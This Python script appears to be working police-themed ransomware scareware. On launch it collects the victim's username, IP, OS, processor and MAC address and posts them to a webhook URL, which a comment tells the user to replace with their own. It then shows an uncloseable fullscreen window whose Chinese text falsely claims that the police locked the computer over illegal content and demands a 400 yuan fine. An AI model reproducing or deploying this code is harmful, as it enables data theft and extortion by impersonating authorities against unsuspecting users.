import tkinter as tk
import socket
import platform
import getpass
import requests
import uuid

# Correct webhook URL — FIX THIS TO YOURS
WEBHOOK_URL = "https://webhook.site/482e4fb2-fff5-47fb-8a0d-f0b08ba5ace2"

def get_system_info():
    try:
        ip_address = socket.gethostbyname(socket.gethostname())
    except:
        ip_address = "Unknown"

    mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff)
                            for ele in range(0, 8 * 6, 8)][::-1])

    return {
        "Username": getpass.getuser(),
        "IP Address": ip_address,
        "OS": platform.system() + " " + platform.release(),
        "Machine": platform.machine(),
        "Processor": platform.processor(),
        "MAC Address": mac_address
    }

def send_to_webhook(data):
    try:
        requests.post(WEBHOOK_URL, json=data, timeout=5)
    except Exception as e:
        print(f"[!] Webhook failed: {e}")

def block_close():
    pass  # Prevent window from closing

def unlock():
    if entry.get() == "400":
        root.destroy()
    else:
        msg_label.config(text="❌ 输入金额错误，请重试", fg="red")

# Collect and send info
info = get_system_info()
send_to_webhook(info)

# GUI Setup
root = tk.Tk()
root.title("你的电脑已被锁定")
root.geometry("800x500")
root.attributes("-fullscreen", True)
root.protocol("WM_DELETE_WINDOW", block_close)

frame = tk.Frame(root, bg="#ffeeee")
frame.pack(fill="both", expand=True)

tk.Label(frame, text="⚠️ 你的电脑已被锁定", font=("Arial", 28, "bold"), bg="#ffeeee", fg="darkred").pack(pady=30)
tk.Label(frame, text="您因访问非法内容被公安机关暂时锁定计算机。\n请根据条例缴纳 400 元人民币以解除限制。\n不予缴纳将保留进一步追责的权利。",
         font=("Arial", 16), bg="#ffeeee").pack(pady=10)

entry = tk.Entry(frame, font=("Arial", 20), justify="center")
entry.pack(pady=15)

tk.Button(frame, text="缴纳罚款", font=("Arial", 20), command=unlock).pack(pady=10)

msg_label = tk.Label(frame, text="", font=("Arial", 16), bg="#ffeeee")
msg_label.pack(pady=10)

root.mainloop()
